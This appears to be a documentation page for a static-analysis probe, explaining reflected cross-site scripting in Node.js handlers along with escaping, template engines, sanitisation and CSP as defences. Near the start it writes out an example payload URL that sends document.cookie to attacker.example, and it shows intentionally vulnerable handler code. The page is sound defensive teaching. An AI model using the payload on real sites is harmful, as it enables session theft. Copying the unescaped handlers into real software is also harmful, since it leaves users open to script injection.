---
title: The response that writes the caller's HTML
slug: reflected-xss
type: pattern
last_updated: 2026-07-27
draft: false
related_probe_ids:
  - Reflected XSS
sources:
  - title: OWASP Top 10 2021 A03 — Injection
    url: https://owasp.org/Top10/A03_2021-Injection/
  - title: CWE-79 — Improper Neutralization of Input During Web Page Generation
    url: https://cwe.mitre.org/data/definitions/79.html
  - title: OWASP Cross Site Scripting Prevention Cheat Sheet
    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
  - title: Express docs — res.send
    url: https://expressjs.com/en/4x/api.html#res.send
  - title: Fastify docs — Reply
    url: https://fastify.dev/docs/latest/Reference/Reply/
  - title: MDN — Content-Security-Policy
    url: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
summary: A route handler that builds an HTML string out of a request value and writes it with res.send, res.end, res.write, or reply.send. The caller supplies part of the page, so the caller can supply a script tag, and it runs in your origin with your session cookie.
---

Every framework quickstart has this handler in it.

```js
app.get('/greet', (req, res) => {
  res.send('<h1>Hello ' + req.query.name + '</h1>');
});
```

It is four lines, it works the first time, and it is the oldest bug on the web. `name` is whatever the visitor put in the URL, and `res.send` with a string sets `Content-Type: text/html`, so the browser parses the result as a document. A request for `/greet?name=<script>fetch("https://attacker.example/"+document.cookie)</script>` returns a page that runs that script in your origin, with your cookies, for whoever opened the link.

Reflected means the payload arrives in the request and comes straight back in the response. Nothing is stored, so nothing shows up in the database when you go looking. The attack is a link, delivered by mail or chat or an ad, and the victim is whoever clicks it.

## The same shape in the other spellings

The sink is not `res.send` specifically. It is any call that puts assembled markup on the wire.

```js
res.end('<p>' + req.body.comment + '</p>');
res.write(`<span>${req.params.id}</span>`);
reply.type('text/html').send(`<b>${request.query.x}</b>`);
```

Template literals hide it better than concatenation because the value sits inside the quotes and reads like part of the page. It is not part of the page. It is a hole the size of whatever the caller sends.

## What escaping actually means here

Escaping converts the five characters that change HTML structure into entities, so the browser renders them as text instead of parsing them as markup.

```js
function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

res.send(`<h1>Hello ${escapeHtml(req.query.name)}</h1>`);
```

Replace `&` first. Doing it last re-encodes the ampersands the earlier replacements just wrote, and `&lt;` becomes `&amp;lt;`, which renders as the literal text `&lt;` instead of `<`.

## The better answer is to stop assembling HTML

A template engine escapes by default, which means the safe path is the one you get for free:

```js
res.render('greet', { name: req.query.name });
```

EJS `<%= %>`, Pug, Nunjucks, and Handlebars `{{ }}` all escape their interpolations. The escape-off forms are deliberately uglier for a reason: EJS `<%- %>`, Handlebars `{{{ }}}`. When you reach for one of those, you are back to owning the escaping yourself.

Returning data instead of markup works too. `res.json({ name: req.query.name })` is not parsed as a document, so a script tag in the value is just characters. The rendering then happens in the browser, where React, Vue, and Svelte escape text interpolation by default.

## When the value is supposed to be HTML

Sometimes the user really is submitting markup, such as a rich-text comment. Escaping would break the feature, so sanitise instead: parse the HTML, keep an allowlist of tags and attributes, and drop the rest.

```js
const clean = DOMPurify.sanitize(req.body.comment);
```

Do it once, on the server, on the way in or on the way out, and be able to say which. A value sanitised in one path and not another is the same bug with extra steps.

## What the probe looks for, and what it does not

PreFlight flags a response write when all of these hold at once: the argument contains HTML tags, it is assembled with `+` or `${}` rather than written whole, and a request value reaches it either at the call or through a variable bound to one earlier in the file. An escaper or sanitiser in the expression, an HTML entity in it, or a declared content type that is not `text/html` all clear the finding.

It does not follow a value across function boundaries, so a string built in one helper and written in another is not reported. It does not read your template files. `res.json` is never flagged, and neither is a response with no markup in it. A clean result here means the direct shape is absent, not that the application escapes everywhere.

## Content-Security-Policy is the second layer, not the first

A CSP without `unsafe-inline` stops an injected `<script>` block from executing even when the escaping fails. It is worth having and it is not a substitute: `<img src=x onerror=...>` and `javascript:` URLs have their own paths around a weak policy, and a policy strict enough to stop all of them is one you have to keep strict as the app grows. Escape at the sink. Ship the CSP as the thing that catches the one you missed.
